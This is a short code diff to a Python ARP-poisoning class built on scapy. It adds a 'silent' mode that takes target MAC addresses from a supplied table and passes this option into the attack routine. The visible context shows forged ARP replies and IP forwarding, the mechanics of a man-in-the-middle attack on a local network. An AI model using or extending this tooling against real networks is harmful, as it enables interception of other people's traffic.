@@ -23,9 +23,13 @@ class ARPPoison:
             exit(1)
         return mac
 
-    def set_mac(self):
-        self.victimMAC = self.get_mac(self.victimIP)
-        self.websiteMAC = self.get_mac(self.websiteIP)
+    def set_mac(self, silent, targets):
+        if not silent:
+            self.victimMAC = self.get_mac(self.victimIP)
+            self.websiteMAC = self.get_mac(self.websiteIP)
+        else:
+            self.victimMAC = targets[self.victimIP]
+            self.websiteMAC = targets[self.websiteIP]
 
     def set_dns(self, dnsIP):
         if self.dnsIP is None:
@@ -53,8 +57,8 @@ class ARPPoison:
         pkt = Ether(dst=hwt2) / ARP(op=2, pdst=ptarget2, hwdst=hwt2, psrc=ptarget1, hwsrc=hwt1)
         scapy.sendp(pkt, iface=self.iface)
 
-    def attack(self, timer, forward, stop_event):
-        self.set_mac()
+    def attack(self, timer, forward, silent, targets, stop_event):
+        self.set_mac(silent, targets)
         if forward:
             self.ip_forward(True)
 
